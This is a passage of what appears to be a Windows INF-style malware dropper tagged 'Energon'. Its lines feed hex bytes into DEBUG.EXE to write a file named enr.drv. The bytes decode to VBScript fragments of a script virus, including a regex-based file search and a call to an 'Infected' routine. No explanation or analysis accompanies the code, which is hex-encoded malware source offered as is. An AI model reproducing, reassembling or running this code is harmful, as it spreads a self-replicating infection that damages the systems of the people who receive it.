%10%\enr.drv,-,,"E 0FC0 3D 4D 69 64 28 41 2C 31 2C 4C 65 6E 28 41 29 29"
%10%\enr.drv,-,,"E 0FD0 3A 58 3D 58 2B 41 3A 59 3D 54 72 75 65 3A 45 78"
%10%\enr.drv,-,,"E 0FE0 69 74 20 46 6F 72 0D 0A 58 3D 58 2B 41 0D 0A 45"
%10%\enr.drv,-,,"E 0FF0 6E 64 20 49 66 0D 0A 4E 65 78 74 0D 0A 49 66 20"
%10%\enr.drv,-,,"E 1000 59 3D 54 72 75 65 20 54 68 65 6E 20 49 66 20 51"
%10%\enr.drv,-,,"E 1010 3D 31 20 4F 72 20 51 3D 32 20 54 68 65 6E 20 45"
%10%\enr.drv,-,,"E 1020 78 69 74 20 46 75 6E 63 74 69 6F 6E 0D 0A 49 66"
%10%\enr.drv,-,,"E 1030 20 51 3D 32 20 41 6E 64 20 59 5A 3D 54 72 75 65"
%10%\enr.drv,-,,"E 1040 20 54 68 65 6E 20 49 6E 66 65 63 74 65 64 28 47"
%10%\enr.drv,-,,"E 1050 29 0D 0A 45 6E 64 20 46 75 6E 63 74 69 6F 6E 0D"
%10%\enr.drv,-,,"E 1060 0A 46 75 6E 63 74 69 6F 6E 20 46 69 6E 64 28 44"
%10%\enr.drv,-,,"E 1070 30 2C 44 31 29 0D 0A 53 65 74 20 50 3D 4E 65 77"
%10%\enr.drv,-,,"E 1080 20 52 65 67 45 78 70 0D 0A 50 2E 50 61 74 74 65"
%10%\enr.drv,-,,"E 1090 72 6E 3D 44 30 26 22 28 3D 7C 20 29 22 0D 0A 50"
%10%\enr.drv,-,,"E 10A0 2E 49 67 6E 6F 72 65 43 61 73 65 3D 54 72 75 65"
%10%\enr.drv,-,,"E 10B0 0D 0A 50 2E 47 6C 6F 62 61 6C 3D 54 72 75 65 0D"
%10%\enr.drv,-,,"E 10C0 0A 53 65 74 20 43 39 3D 50 2E 45 78 65 63 75 74"
%10%\enr.drv,-,,"E 10D0 65 28 4C 54 72 69 6D 28 44 31 29 29 0D 0A 46 6F"
%10%\enr.drv,-,,"E 10E0 72 20 45 61 63 68 20 4D 61 74 63 68 20 69 6E 20"
%10%\enr.drv,-,,"E 10F0 43 39 0D 0A 49 66 20 4D 61 74 63 68 2E 46 69 72"
%10%\enr.drv,-,,"E 1100 73 74 49 6E 64 65 78 3D 30 20 54 68 65 6E 20 46"
%10%\enr.drv,-,,"E 1110 69 6E 64 3D 31 3A 45 78 69 74 20 46 6F 72 0D 0A"
%10%\enr.drv,-,,"E 1120 4E 65 78 74 0D 0A 45 6E 64 20 46 75 6E 63 74 69"
%10%\enr.drv,-,,"E 1130 6F 6E"
%10%\enr.drv,-,,"RCX"
%10%\enr.drv,-,,"1032"
%10%\enr.drv,-,,"W"
%10%\enr.drv,-,,"Q"
;Energon